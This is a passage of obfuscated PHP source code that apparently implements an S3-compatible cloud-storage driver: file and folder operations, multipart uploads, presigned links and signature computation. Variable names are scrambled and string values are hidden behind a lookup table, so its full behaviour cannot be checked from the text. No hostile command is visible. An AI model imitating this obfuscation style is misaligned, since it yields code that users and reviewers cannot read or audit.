array(); public function __construct($û¹¬­ÊÌ) { set_timeout(); require_once SDK_DIR . $_SERVER[¼èá¯æÙ][226]; parent::__construct(); $this->_init($û¹¬­ÊÌ); } public function _init($Ñò·ö”Ğ) { $ë×Ú¹É =& $_SERVER[¼èá¯æÙ]; $this->config = $Ñò·ö”Ğ; foreach ($Ñò·ö”Ğ as $Ûğ‘ ÚŠ => $ü Àô¢) { if (isset($this->{$Ûğ‘ ÚŠ})) { $this->{$Ûğ‘ ÚŠ} = $ü Àô¢; } } $this->endpoint = $Ñò·ö”Ğ[$ë×Ú¹É[227]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $¤Âİº‹ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($¤Âİº‹, 0, 7) == $ë×Ú¹É[228]) { $¤Âİº‹ = $ë×Ú¹É[229] . substr($¤Âİº‹, 7); } $this->client->setEndpoint($¤Âİº‹); if (in_array(ACTION, array($ë×Ú¹É[222], $ë×Ú¹É[223]))) { $this->client->setExceptions(); } } public function setSignVersion($ØıÖ®Ö³ = "\166\x34") { $this->signVer = $ØıÖ®Ö³; $this->client->setSignVersion($ØıÖ®Ö³); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $øëÀ´ÍË) { return null; } } public function isBucketCors() { $î…äæõÚ =& $_SERVER[¼èá¯æÙ]; $á™èš’˜ = $this->getBucketCors(); if (!$á™èš’˜ || !is_array($á™èš’˜)) { return !1; } if (!is_array($á™èš’˜[$î…äæõÚ[230]])) { $á™èš’˜[$î…äæõÚ[230]] = explode($î…äæõÚ[50], $á™èš’˜[$î…äæõÚ[230]]); } if ($á™èš’˜[$î…äæõÚ[231]] != $î…äæõÚ[232] || !in_array($î…äæõÚ[232], $á™èš’˜[$î…äæõÚ[230]])) { return !1; } $Ï”À¡û = array_map($î…äæõÚ[233], $á™èš’˜[$î…äæõÚ[234]]); if (!is_array($Ï”À¡û)) { $Ï”À¡û = array(); } $ÚÀÏÉ = array($î…äæõÚ[235], $î…äæõÚ[236], $î…äæõÚ[237], $î…äæõÚ[238], $î…äæõÚ[239]); $ÇŠ©²Ñ‚ = array_diff($ÚÀÏÉ, $Ï”À¡û); return empty($ÇŠ©²Ñ‚); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($µ“éØØÒ, $Ö“‘š™ = '', $¸©ªŒ = REPEAT_RENAME) { $ùûÕãôÉ = $this->setContent($µ“éØØÒ, $Ö“‘š™); if ($ùûÕãôÉ !== !1) { return $this->getPathOuter($µ“éØØÒ); } return !1; } public function mkdir($ƒÃàÁ¨î, $Åñ‹©æ³ = REPEAT_SKIP) { $Å°ğåàè =& $_SERVER[¼èá¯æÙ]; if (empty($ƒÃàÁ¨î) && $ƒÃàÁ¨î !== $Å°ğåàè[240]) { return !1; } if ($Åñ‹©æ³ && $this->_isFolder($ƒÃàÁ¨î)) { return $this->getPathOuter($ƒÃàÁ¨î); } $ôàÎæÁ½ = $this->setContent($ƒÃàÁ¨î, $Å°ğåàè[12], !0); if ($ôàÎæÁ½ !== !1) { return $this->getPathOuter($ƒÃàÁ¨î); } return !1; } public function copyFile($ğ§°ôŠ, $¯øªÕ§, $†š¨ãÍ = array()) { $ùŞ£ñôß =& $_SERVER[¼èá¯æÙ]; $‡”“¡æĞ = $this->objectMeta($ğ§°ôŠ); if (!$‡”“¡æĞ) { return !1; } if ($‡”“¡æĞ[$ùŞ£ñôß[89]] <= 1024 * 1024 * 200) { $ç±˜˜Ÿá = $this->client->copyObject($this->bucket, $ğ§°ôŠ, $this->bucket, $¯øªÕ§, $ùŞ£ñôß[241], $†š¨ãÍ); } else { $ç±˜˜Ÿá = $this->client->multiCopyObject($this->bucket, $ğ§°ôŠ, $this->bucket, $¯øªÕ§, $†š¨ãÍ); } $ç±˜˜Ÿá = $ç±˜˜Ÿá ? $this->getPathOuter($¯øªÕ§) : !1; return $ç±˜˜Ÿá; } public function moveFile($©¸÷Æ€, $õ¹À“éı) { if ($this->copyFile($©¸÷Æ€, $õ¹À“éı)) { $this->delFile($©¸÷Æ€); return $this->getPathOuter($õ¹À“éı); } return !1; } public function delFile($”•£ñ½Ô) { return $this->client->deleteObject($this->bucket, $”•£ñ½Ô); } public function delFolder($ŞÆŒ›¾) { $·¶ËÃ×² =& $_SERVER[¼èá¯æÙ]; if (!$this->exist($ŞÆŒ›¾)) { return !0; } $this->listItemCache = !1; $¨¾ş¯ê = $this->fileList($ŞÆŒ›¾); $this->listItemCache = !0; $â·à›² = trim($ŞÆŒ›¾, $·¶ËÃ×²[8]) . $·¶ËÃ×²[8]; if (!empty($ŞÆŒ›¾) && $ŞÆŒ›¾ !== $·¶ËÃ×²[240] && !in_array($â·à›², $¨¾ş¯ê[$·¶ËÃ×²[95]])) { $¨¾ş¯ê[$·¶ËÃ×²[95]][] = $â·à›²; } $Äù¯ = $this->delByBatch($¨¾ş¯ê[$·¶ËÃ×²[96]]); if (!$Äù¯) { return !1; } $Äù¯ = $this->delByBatch($¨¾ş¯ê[$·¶ËÃ×²[95]]); if (!$Äù¯) { return !1; } return $this->delFile($â·à›²); } private function delByBatch($Áë”¶‡³) { foreach (array_chunk($Áë”¶‡³, 1000) as $É¶‹¹») { $‹öşÊú = $this->client->deleteObjects($this->bucket, $É¶‹¹»); if (!$‹öşÊú) { return !1; } } return !0; } public function rename($Ş¿ÚøâË, $™÷“î•³) { return $this->renameObject($Ş¿ÚøâË, $™÷“î•³); } public function listPath($ïæİšÈ, $ÈÔÍ‚šÈ = false) { $‚²Œ«©Í =& $_SERVER[¼èá¯æÙ]; $Äó‰­š = $this->fileList($ïæİšÈ, $‚²Œ«©Í[8], !0); foreach ($Äó‰­š[$‚²Œ«©Í[95]] as $€µ­¼—± => $‡‚ÈšÔÁ) { $Äó‰­š[$‚²Œ«©Í[95]][$€µ­¼—±] = $this->folderInfo($‡‚ÈšÔÁ, $ÈÔÍ‚šÈ, $‡‚ÈšÔÁ); } foreach ($Äó‰­š[$‚²Œ«©Í[96]] as $€µ­¼—± => $‡‚ÈšÔÁ) { $Äó‰­š[$‚²Œ«©Í[96]][$€µ­¼—±] = $this->fileInfo($‡‚ÈšÔÁ[$‚²Œ«©Í[32]], $ÈÔÍ‚šÈ, $‡‚ÈšÔÁ); } return $Äó‰­š; } protected function infoChildren($¯˜ìâêÛ, &$Êú ¸è) { $²Ïİ¾¢ =& $_SERVER[¼èá¯æÙ]; $Õ—©Éı = $this->fileList($¯˜ìâêÛ, $²Ïİ¾¢[12], !0); $Êú ¸è[$²Ïİ¾¢[91]] += count($Õ—©Éı[$²Ïİ¾¢[95]]); $Êú ¸è[$²Ïİ¾¢[90]] += count($Õ—©Éı[$²Ïİ¾¢[96]]); foreach ($Õ—©Éı[$²Ïİ¾¢[96]] as $Ÿ€›–ù) { if (!$Ÿ€›–ù || !$Ÿ€›–ù[$²Ïİ¾¢[89]]) { continue; } $Êú ¸è[$²Ïİ¾¢[89]] += $Ÿ€›–ù[$²Ïİ¾¢[89]]; } } private function fileInfo($Ëñö, $³×·Ô‰ï = false, $÷‚ÈíÅ = array()) { $©”“Î“Ğ =& $_SERVER[¼èá¯æÙ]; $ß÷“Ã ¸ = array($©”“Î“Ğ[32] => $this->pathThis($Ëñö), $©”“Î“Ğ[97] => $this->getPathOuter($Ëñö), $©”“Î“Ğ[33] => $©”“Î“Ğ[242], $©”“Î“Ğ[179] => $this->ext($Ëñö), $©”“Î“Ğ[89] => isset($÷‚ÈíÅ[$©”“Î“Ğ[89]]) ? $÷‚ÈíÅ[$©”“Î“Ğ[89]] : 0); if ($³×·Ô‰ï) { return $ß÷“Ã ¸; } $ß÷“Ã ¸[$©”“Î“Ğ[243]] = $ß÷“Ã ¸[$©”“Î“Ğ[98]] = 0; $ß÷“Ã ¸[$©”“Î“Ğ[244]] = $ß÷“Ã ¸[$©”“Î“Ğ[245]] = !0; if (empty($÷‚ÈíÅ)) { $÷‚ÈíÅ = $this->objectMeta($Ëñö); if (!$÷‚ÈíÅ) { return $ß÷“Ã ¸; } } if (isset($÷‚ÈíÅ[$©”“Î“Ğ[246]]) && $÷‚ÈíÅ[$©”“Î“Ğ[246]]) { $ß÷“Ã ¸[$©”“Î“Ğ[247]] = $÷‚ÈíÅ[$©”“Î“Ğ[246]]; } if (isset($÷‚ÈíÅ[$©”“Î“Ğ[216]])) { $ß÷“Ã ¸[$©”“Î“Ğ[98]] = $÷‚ÈíÅ[$©”“Î“Ğ[216]]; } if (isset($÷‚ÈíÅ[$©”“Î“Ğ[89]])) { $ß÷“Ã ¸[$©”“Î“Ğ[89]] = $÷‚ÈíÅ[$©”“Î“Ğ[89]]; } return $ß÷“Ã ¸; } private function folderInfo($«±’æÜ¼, $¤øáïª = false, $ÎÔ ù¥ = array()) { $€•ë×ú“ =& $_SERVER[¼èá¯æÙ]; $£‰×€Í± = array($€•ë×ú“[32] => $this->pathThis($«±’æÜ¼), $€•ë×ú“[97] => $this->getPathOuter($€•ë×ú“[8] . $«±’æÜ¼), $€•ë×ú“[33] => $€•ë×ú“[88]); if ($¤øáïª) { return $£‰×€Í±; } $£‰×€Í±[$€•ë×ú“[243]] = $£‰×€Í±[$€•ë×ú“[98]] = 0; $£‰×€Í±[$€•ë×ú“[244]] = $£‰×€Í±[$€•ë×ú“[245]] = !0; if ($«±’æÜ¼ == $€•ë×ú“[12]) { return $£‰×€Í±; } if (empty($ÎÔ ù¥)) { $ÎÔ ù¥ = $this->objectMeta(trim($«±’æÜ¼, $€•ë×ú“[8]) . $€•ë×ú“[8]); } if (isset($ÎÔ ù¥[$€•ë×ú“[216]])) { $£‰×€Í±[$€•ë×ú“[243]] = $ÎÔ ù¥[$€•ë×ú“[216]]; } return $£‰×€Í±; } private function fileList($ßßÆÍêÏ, $÷ÈÙËö‹ = '', $‡Ø‹£ = 0) { $±ò‘ó„ò =& $_SERVER[¼èá¯æÙ]; $ØÎğ‹óÑ = rtrim($ßßÆÍêÏ, $±ò‘ó„ò[8]) . $±ò‘ó„ò[8]; $æÖá­› = $this->listObjs($ØÎğ‹óÑ, null, null, $÷ÈÙËö‹); if (!$æÖá­›) { return array($±ò‘ó„ò[95] => array(), $±ò‘ó„ò[96] => array()); } $°èÁ½Õ¢ = $…ìğµ‘˜ = array(); foreach ($æÖá­›[$±ò‘ó„ò[248]] as $µâ·ùú‘) { $¬±÷øë« = $µâ·ùú‘[$±ò‘ó„ò[32]]; if ($¬±÷øë« == $ØÎğ‹óÑ) { continue; } $³òé™å = isset($µâ·ùú‘[$±ò‘ó„ò[89]]) ? $µâ·ùú‘[$±ò‘ó„ò[89]] : 0; $áï­ÑçÅ = $³òé™å == 0 && substr($¬±÷øë«, strlen($¬±÷øë«) - 1, 1) == $±ò‘ó„ò[8] ? !0 : !1; $this->cacheMethodInfoSet($¬±÷øë«, $áï­ÑçÅ, $µâ·ùú‘); if ($áï­ÑçÅ) { $°èÁ½Õ¢[] = $¬±÷øë«; continue; } $…ìğµ‘˜[] = $‡Ø‹£ ? $µâ·ùú‘ : $¬±÷øë«; } foreach ($æÖá­›[$±ò‘ó„ò[249]] as $µâ·ùú‘) { $°èÁ½Õ¢[] = $µâ·ùú‘[$±ò‘ó„ò[32]]; $this->cacheMethodInfoSet($µâ·ùú‘[$±ò‘ó„ò[32]], !0); } $this->cacheMethodInfoSet($ßßÆÍêÏ, !0); return array($±ò‘ó„ò[95] => $°èÁ½Õ¢, $±ò‘ó„ò[96] => $…ìğµ‘˜); } private function listObjs($™ØÚ‹Îï, $›îÍ®ßœ = null, $«Ÿ‡¯õ° = null, $É·•ö = null) { $¨âÀ±… =& $_SERVER[¼èá¯æÙ]; $™ØÚ‹Îï = trim($™ØÚ‹Îï, $¨âÀ±…[8]); $Ÿ¸˜ë®— = empty($™ØÚ‹Îï) && $™ØÚ‹Îï !== $¨âÀ±…[240] ? $¨âÀ±…[12] : $™ØÚ‹Îï . $¨âÀ±…[8]; return $this->client->getBucket($this->bucket, $Ÿ¸˜ë®—, $›îÍ®ßœ, $«Ÿ‡¯õ°, $É·•ö, !0); } public function has($£Œ½ãÚÂ, $Õ¬ÒÆ ¨ = false, $Ì‚ã†ê = true) { $‚úÆİ =& $_SERVER[¼èá¯æÙ]; $£Œ½ãÚÂ = trim($£Œ½ãÚÂ, $‚úÆİ[8]); $¢œ×áü¨ = empty($£Œ½ãÚÂ) && $£Œ½ãÚÂ !== $‚úÆİ[240] ? $‚úÆİ[12] : $£Œ½ãÚÂ . $‚úÆİ[8]; $âØğÌ’³ = null; $Â¾öÕ = 500; $Îş›è¥Ò = $‚úÆİ[8]; $²ËıÀù = $ÖİØ–®ã = array(); while (!0) { $èâ‡Ã = $this->listObjs($£Œ½ãÚÂ, $âØğÌ’³, $Â¾öÕ, $Îş›è¥Ò); if (!$èâ‡Ã) { break; } $âØğÌ’³ = $èâ‡Ã[$‚úÆİ[250]]; $åÎê£Š± = $èâ‡Ã[$‚úÆİ[248]]; $ÜàÏ‰‘¶ = $èâ‡Ã[$‚úÆİ[249]]; if (empty($åÎê£Š±) && empty($ÜàÏ‰‘¶)) { break; } if (count($åÎê£Š±) == 1 && $åÎê£Š±[0][$‚úÆİ[32]] == $¢œ×áü¨) { break; } if ($Õ¬ÒÆ ¨) { if (count($åÎê£Š±)) { $åÎê£Š± = array_column($åÎê£Š±, $‚úÆİ[32]); $²ËıÀù = array_merge($²ËıÀù, $åÎê£Š±); } if (count($ÜàÏ‰‘¶)) { $ÜàÏ‰‘¶ = array_column($ÜàÏ‰‘¶, $‚úÆİ[32]); $ÖİØ–®ã = array_merge($ÖİØ–®ã, $ÜàÏ‰‘¶); } if ($âØğÌ’³ === null) { break; } continue; } if ($Ì‚ã†ê) { if (!empty($åÎê£Š±)) { if (count($åÎê£Š±) > 1 || isset($åÎê£Š±[0][$‚úÆİ[32]]) && $åÎê£Š±[0][$‚úÆİ[32]] != $¢œ×áü¨) { return !0; } } } else { if (!empty($ÜàÏ‰‘¶)) { return !0; } } if ($âØğÌ’³ === null) { break; } } if ($Õ¬ÒÆ ¨) { $²ËıÀù = array_diff($²ËıÀù, array($¢œ×áü¨)); $²ËıÀù = count(array_unique($²ËıÀù)); $ÖİØ–®ã = count(array_unique($ÖİØ–®ã)); return array($‚úÆİ[251] => $²ËıÀù, $‚úÆİ[252] => $ÖİØ–®ã); } return !1; } public function listAll($§Ù–È„) { $¹„ŞòĞ =& $_SERVER[¼èá¯æÙ]; $»°¾¼Œ = $this->fileList($§Ù–È„, $¹„ŞòĞ[12], !0); $´©’³ó = array_to_keyvalue($»°¾¼Œ[$¹„ŞòĞ[96]], $¹„ŞòĞ[32]); foreach ($»°¾¼Œ[$¹„ŞòĞ[95]] as $•ò»›î’) { if (is_string($•ò»›î’)) { $´©’³ó[$•ò»›î’] = array($¹„ŞòĞ[89] => 0); } } return $this->listAllFiles($§Ù–È„, $´©’³ó); } public function canRead($Ã»›ÃöÌ) { $ÒÁÌª—ø =& $_SERVER[¼èá¯æÙ]; $¨÷”ïÕé = $this->client->getAccessControlPolicy($this->bucket, $Ã»›ÃöÌ); if (!$¨÷”ïÕé) { return !1; } return in_array($¨÷”ïÕé, array($ÒÁÌª—ø[253], $ÒÁÌª—ø[254], $ÒÁÌª—ø[255])) ? !0 : !1; } public function canWrite($ãÏ‡À) { $œñòï¢‰ =& $_SERVER[¼èá¯æÙ]; $ú¾ÜÛë = $this->client->getAccessControlPolicy($this->bucket, $ãÏ‡À); if (!$ú¾ÜÛë) { return !1; } return in_array($ú¾ÜÛë, array($œñòï¢‰[253], $œñòï¢‰[254])) ? !0 : !1; } public function getContent($ûÉŒ÷í) { return $this->client->getObject($this->bucket, $ûÉŒ÷í); } public function setContent($ÆŞøÊ, $¢ÎëÏ  = '', $Ì¤ŠÛ´¥ = false) { $ÑÃêû©ı =& $_SERVER[¼èá¯æÙ]; $ÆŞøÊ = $Ì¤ŠÛ´¥ ? trim($ÆŞøÊ, $ÑÃêû©ı[8]) . $ÑÃêû©ı[8] : $ÆŞøÊ; $¥µ‹®¡ƒ = get_file_mime(get_path_ext($ÆŞøÊ)); $ı°Ğàã‚ = $this->client->putObject($¢ÎëÏ , $this->bucket, $ÆŞøÊ, $ÑÃêû©ı[241], array(), $¥µ‹®¡ƒ); if (!$ı°Ğàã‚) { return !1; } if ($Ì¤ŠÛ´¥) { return !0; } return $ı°Ğàã‚ ? !0 : !1; } public function fileSubstr($³ìÈÑùÇ, $õ¬ÍªÊÓ, $‡ËæÙæİ) { $¾‹‡ªÜ = $õ¬ÍªÊÓ + $‡ËæÙæİ - 1; return $this->client->getObject($this->bucket, $³ìÈÑùÇ, array($_SERVER[¼èá¯æÙ][256] => "\142\171\164\145\163\75{$õ¬ÍªÊÓ}\55{$¾‹‡ªÜ}")); } public function upload($ÖßåÙû…, $ßòÍôÒ, $Îñ§üÏª = false, $ƒà è© = REPEAT_REPLACE) { $°†“æÙ› =& $_SERVER[¼èá¯æÙ]; $µò¶„İÅ = array($°†“æÙ›[257] => @md5_file($ßòÍôÒ)); $‘ıª¯“Ç = array($°†“æÙ›[258] => get_file_mime(get_path_ext($ÖßåÙû…))); if (IO::size($ßòÍôÒ) <= 1024 * 1024 * 200) { $»äß©Ïù = $this->client->putObjectFile($ßòÍôÒ, $this->bucket, $ÖßåÙû…, $°†“æÙ›[241], $µò¶„İÅ, $‘ıª¯“Ç); return !empty($»äß©Ïù) ? $this->getPathOuter($ÖßåÙû…) : !1; } $Ô‹Ÿ¶… = $this->client->multiUploadObject($ßòÍôÒ, $this->bucket, trim($ÖßåÙû…, $°†“æÙ›[8]), $µò¶„İÅ, $‘ıª¯“Ç); return $Ô‹Ÿ¶… ? $this->getPathOuter($ÖßåÙû…) : !1; } public function download($¯âÚ’ˆ¬, $í—ï€ø) { if (!@is_dir($this->pathFather($í—ï€ø)) && !IO::mkdir($this->pathFather($í—ï€ø))) { return !1; } $•ùæºì = $this->client->getObject($this->bucket, $¯âÚ’ˆ¬, array(), $í—ï€ø); return $•ùæºì !== !1 ? $í—ï€ø : !1; } public function link($»£²ØÒ, $ÜÆÑŒÒÕ = array()) { return $this->getPreSignedURL($»£²ØÒ, 3600 * 12, $ÜÆÑŒÒÕ); } private function getPreSignedURL($ÃŒÚèÚì, $È”‘ÒÚ, $ÎŠ‡ï½í = array(), $¹ØÉ‚ = "\x47\105\x54") { $µƒ¦¹¬¬ =& $_SERVER[¼èá¯æÙ]; $ÃŒÚèÚì = trim($ÃŒÚèÚì, $µƒ¦¹¬¬[8]); if ($this->signVer == $µƒ¦¹¬¬[259]) { return $this->client->getPreSignedV2URL($this->bucket, $ÃŒÚèÚì, $È”‘ÒÚ, $¹ØÉ‚, $ÎŠ‡ï½í); } return $this->client->getPreSignedV4URL($this->bucket, $ÃŒÚèÚì, $È”‘ÒÚ, array(), $¹ØÉ‚, $ÎŠ‡ï½í); } public function fileOut($÷û¯ÊŸ–, $Ãì¢Ã²¼ = false, $¡§¨ë¼Í = false, $Õ¾Á’ = '') { $”Íû…ªÈ =& $_SERVER[¼èá¯æÙ]; if ($this->isFileOutServer()) { return $this->fileOutServer($÷û¯ÊŸ–, $Ãì¢Ã²¼, $¡§¨ë¼Í, $Õ¾Á’); } if (!$¡§¨ë¼Í) { $¡§¨ë¼Í = $this->pathThis($÷û¯ÊŸ–); } $Á“¤º‰ = get_file_mime(get_path_ext($¡§¨ë¼Í)); if ($Á“¤º‰ == $”Íû…ªÈ[260]) { return parent::fileOut($÷û¯ÊŸ–, $Ãì¢Ã²¼, $¡§¨ë¼Í, $Õ¾Á’); } $âßÜ‹—õ = array($”Íû…ªÈ[261] => $Á“¤º‰); if ($Ãì¢Ã²¼) { $âßÜ‹—õ[$”Íû…ªÈ[262]] = $”Íû…ªÈ[263] . rawurlencode($¡§¨ë¼Í); } else { } $ÒÕßÓâÇ = $this->link($÷û¯ÊŸ–, $âßÜ‹—õ); $this->fileOutLink($ÒÕßÓâÇ); } public function fileOutServer($Î¹äÌœ, $Ë‘ƒÉÜ = false, $ß¿ÕÉš¶ = false, $ÏÜÑÇ€œ = '') { parent::fileOut($Î¹äÌœ, $Ë‘ƒÉÜ, $ß¿ÕÉš¶, $ÏÜÑÇ€œ); } public function fileOutImageServer($ñÛÒã¢, $ñó…£şä = 250) { parent::fileOutImage($ñÛÒã¢, $ñó…£şä); } public function hashMd5($™„â«È¦, $ÔşÔœ² = '') { $ä—õŸã€ = $this->objectMeta($™„â«È¦); if (!$ä—õŸã€) { return !1; } $ÔşÔœ² = $ÔşÔœ² ? $ÔşÔœ² : _get($ä—õŸã€, $_SERVER[¼èá¯æÙ][264]); return $ÔşÔœ²; } public function uploadFormData($ò—âì‘Ê, $Ú²‹ÈÙû = 3600) { $Çˆ°Àúş =& $_SERVER[¼èá¯æÙ]; if (!$this->_isClientAsync()) { $™ëê‚æ = $this->getPreSignedURL($ò—âì‘Ê, $Ú²‹ÈÙû, array(), $Çˆ°Àúş[265]); return array($Çˆ°Àúş[218] => str_replace($Çˆ°Àúş[228], $Çˆ°Àúş[266], $™ëê‚æ)); } if (isset($GLOBALS[$Çˆ°Àúş[6]][$Çˆ°Àúş[102]][$Çˆ°Àúş[267]]) && $GLOBALS[$Çˆ°Àúş[6]][$Çˆ°Àúş[102]][$Çˆ°Àúş[267]] == $Çˆ°Àúş[240]) { return $this->uploadMultiData($ò—âì‘Ê, $Ú²‹ÈÙû); } if ($this->signVer == $Çˆ°Àúş[259]) { return $this->uploadFormDataV2($ò—âì‘Ê, $Ú²‹ÈÙû); } return $this->uploadFormDataV4($ò—âì‘Ê, $Ú²‹ÈÙû); } public function uploadFormDataV2($ŞÌšı«, $ö”³ğ = 3600) { $‡¤“ßÚà =& $_SERVER[¼èá¯æÙ]; $„³Ú°÷ = $this->pathFather($ŞÌšı«); $şı¸çùö = $this->client->getHttpUploadPostParams($this->bucket, $„³Ú°÷, $‡¤“ßÚà[241], $ö”³ğ); $§Ç­å = array_merge((array) $şı¸çùö, array($‡¤“ßÚà[268] => $‡¤“ßÚà[259], $‡¤“ßÚà[218] => $this->getHost())); if ($this->_isClientAsync()) { unset($§Ç­å[$‡¤“ßÚà[268]]); } return $§Ç­å; } public function uploadFormDataV4($³›™÷ß, $óÌµ¡™Ğ = 3600) { $Ú‘¾®¡° =& $_SERVER[¼èá¯æÙ]; $üå¿ÜÔ = $Ú‘¾®¡°[241]; $Œ•¤Ÿì = $Ú‘¾®¡°[269]; $—œäçó  = $Ú‘¾®¡°[72]; $€·ï…Íõ = gmdate($Ú‘¾®¡°[270]); $Ò–ëôë¾ = gmdate($Ú‘¾®¡°[271]); $€ ¹Æ¼´ = $Ú‘¾®¡°[272]; $ˆ¶³í•œ = $óÌµ¡™Ğ . $Ú‘¾®¡°[12]; $°±»ÓôŒ = $Ú‘¾®¡°[273]; $õ¸¥íí = array($this->accessKey, $Ò–ëôë¾, $this->region, $—œäçó , $€ ¹Æ¼´); $‰áøãÖ• = implode($Ú‘¾®¡°[8], $õ¸¥íí); $óˆÒÄæè = array($Ú‘¾®¡°[274] => gmdate($Ú‘¾®¡°[275], strtotime($Ú‘¾®¡°[276])), $Ú‘¾®¡°[277] => array(array($Ú‘¾®¡°[278] => $this->bucket), array($Ú‘¾®¡°[279], $Ú‘¾®¡°[280], $Ú‘¾®¡°[12]), array($Ú‘¾®¡°[279], $Ú‘¾®¡°[281], $Ú‘¾®¡°[12]), array($Ú‘¾®¡°[282] => $°±»ÓôŒ), array($Ú‘¾®¡°[283] => $‰áøãÖ•), array($Ú‘¾®¡°[284] => $Œ•¤Ÿì), array($Ú‘¾®¡°[285] => $€·ï…Íõ), array($Ú‘¾®¡°[286] => $ˆ¶³í•œ))); $¼ÎÍ²ıÀ = base64_encode(json_encode($óˆÒÄæè)); $°…¬Æ¡ = hash_hmac($Ú‘¾®¡°[287], $Ò–ëôë¾, $Ú‘¾®¡°[288] . $this->secret, !0); $Â­şÌ÷Ä = hash_hmac($Ú‘¾®¡°[287], $this->region, $°…¬Æ¡, !0); $‚¾Ùâš = hash_hmac($Ú‘¾®¡°[287], $—œäçó , $Â­şÌ÷Ä, !0); $Ğ¤–°è› = hash_hmac($Ú‘¾®¡°[287], $€ ¹Æ¼´, $‚¾Ùâš, !0); $Ê’¥š—è = hash_hmac($Ú‘¾®¡°[287], $¼ÎÍ²ıÀ, $Ğ¤–°è›); $»©˜Ì®Ğ = array($Ú‘¾®¡°[258] => $Ú‘¾®¡°[12], $Ú‘¾®¡°[282] => $°±»ÓôŒ, $Ú‘¾®¡°[289] => $¼ÎÍ²ıÀ, $Ú‘¾®¡°[283] => $‰áøãÖ•, $Ú‘¾®¡°[284] => $Œ•¤Ÿì, $Ú‘¾®¡°[285] => $€·ï…Íõ, $Ú‘¾®¡°[286] => $ˆ¶³í•œ, $Ú‘¾®¡°[290] => $Ê’¥š—è, $Ú‘¾®¡°[268] => $Ú‘¾®¡°[259], $Ú‘¾®¡°[218] => $this->getHost()); if ($this->_isClientAsync()) { unset($»©˜Ì®Ğ[$Ú‘¾®¡°[268]]); } return $»©˜Ì®Ğ; } public function uploadMultiData($äëıÙ­Ù, $•á›†™ = 3600) { $ËÒÜíü¼ =& $_SERVER[¼èá¯æÙ]; $†”Êæ = $this->signVer == $ËÒÜíü¼[259] ? gmdate($ËÒÜíü¼[291]) : gmdate($ËÒÜíü¼[292]); $œáéêş¦ = array(); $ÃÉöŒÛÂ = $this->client->getUploadId($this->bucket, $äëıÙ­Ù, $œáéêş¦); if (!$ÃÉöŒÛÂ) { return !1; } $°‰ª­ÓÙ = array($ËÒÜíü¼[293] => $ÃÉöŒÛÂ, $ËÒÜíü¼[218] => $this->getHost() . $ËÒÜíü¼[8] . $this->pathEncode($äëıÙ­Ù), $ËÒÜíü¼[294] => $†”Êæ, $ËÒÜíü¼[107] => $äëıÙ­Ù, $ËÒÜíü¼[268] => $this->signVer); if ($this->_isClientAsync()) { unset($°‰ª­ÓÙ[$ËÒÜíü¼[268]]); } return $°‰ª­ÓÙ; } public function uploadMultiAuth($°Û«ˆ”Ì, $„¿Øê×£ = array()) { $ÇÏ¿Èâ =& $_SERVER[¼èá¯æÙ]; if ($this->signVer == $ÇÏ¿Èâ[259]) { if (isset($„¿Øê×£[$ÇÏ¿Èâ[295]])) { return $this->uploadPartAuthV2($°Û«ˆ”Ì, $„¿Øê×£); } return $this->uploadListAuthV2($°Û«ˆ”Ì, $„¿Øê×£); } if (isset($„¿Øê×£[$ÇÏ¿Èâ[295]])) { return $this->uploadPartAuthV4($°Û«ˆ”Ì, $„¿Øê×£); } return $this->uploadListAuthV4($°Û«ˆ”Ì, $„¿Øê×£); } public function uploadPartAuthV2($ÙôØİÎ, $†¬â«Ü = array()) { $´ ¶¶‡Ç =& $_SERVER[¼èá¯æÙ]; $áéõ‹¿¤ = $†¬â«Ü[$´ ¶¶‡Ç[107]]; $€Ë‘ö¹» = gmdate($´ ¶¶‡Ç[291]); $ûÑÆÃ· = array_intersect_key($†¬â«Ü, array_flip(array($´ ¶¶‡Ç[295], $´ ¶¶‡Ç[293]))); ksort($ûÑÆÃ·); $Í“ÜÜ = $ûÑÆÃ· ? $´ ¶¶‡Ç[86] . http_build_query($ûÑÆÃ·, null, $´ ¶¶‡Ç[296], PHP_QUERY_RFC3986) : $´ ¶¶‡Ç[12]; $ñªÂœæâ = array($´ ¶¶‡Ç[265], $´ ¶¶‡Ç[12], $´ ¶¶‡Ç[133], $´ ¶¶‡Ç[12], "\x78\55\141\155\x7a\x2d\144\x61\x74\145\x3a{$€Ë‘ö¹»}", $´ ¶¶‡Ç[8] . $this->bucket . $´ ¶¶‡Ç[8] . $this->pathEncode($áéõ‹¿¤) . $Í“ÜÜ); $×ãŒ‘ò = implode($´ ¶¶‡Ç[59], $ñªÂœæâ); $‡èÏë½æ = $this->client->__getSignature($×ãŒ‘ò); return array($´ ¶¶‡Ç[297] => $‡èÏë½æ, $´ ¶¶‡Ç[294] => $€Ë‘ö¹»); } public function uploadListAuthV2($ï÷Èıšú, $°õ‘Îú‹ = array()) { $—ÄçĞöë =& $_SERVER[¼èá¯æÙ]; $•û¨Ê—Á = $°õ‘Îú‹[$—ÄçĞöë[107]]; $Äò û = $°õ‘Îú‹[$—ÄçĞöë[293]]; $æ¥µËŸÒ = $this->client->listParts($this->bucket, $•û¨Ê—Á, $Äò û); if (!$æ¥µËŸÒ) { return !1; } $–úŸ–«Ğ = gmdate($—ÄçĞöë[291]); $ÕĞê ô§ = $—ÄçĞöë[298] . $Äò û; $Ï­“ê„ = array($—ÄçĞöë[299], $—ÄçĞöë[12], $—ÄçĞöë[133], $—ÄçĞöë[12], "\170\x2d\x61\155\172\x2d\x64\141\x74\x65\x3a{$–úŸ–«Ğ}", $—ÄçĞöë[8] . $this->bucket . $—ÄçĞöë[8] . $this->pathEncode($•û¨Ê—Á) . $ÕĞê ô§); $ÅÅˆ„ò = implode($—ÄçĞöë[59], $Ï­“ê„); $ç­˜¾Î = $this->client->__getSignature($ÅÅˆ„ò); return array($—ÄçĞöë[297] => $ç­˜¾Î, $—ÄçĞöë[294] => $–úŸ–«Ğ, $—ÄçĞöë[300] => $æ¥µËŸÒ); } public function uploadPartAuthV4($¹õŒøÔì, $“Šãª = array()) { $¨†É‡Ò‰ =& $_SERVER[¼èá¯æÙ]; $×¢²Œáç = $“Šãª[$¨†É‡Ò‰[107]]; $öè»…Ï = array($¨†É‡Ò‰[285] => gmdate($¨†É‡Ò‰[292]), $¨†É‡Ò‰[301] => _get($“Šãª, $¨†É‡Ò‰[302], hash($¨†É‡Ò‰[287], $¨†É‡Ò‰[12]))); 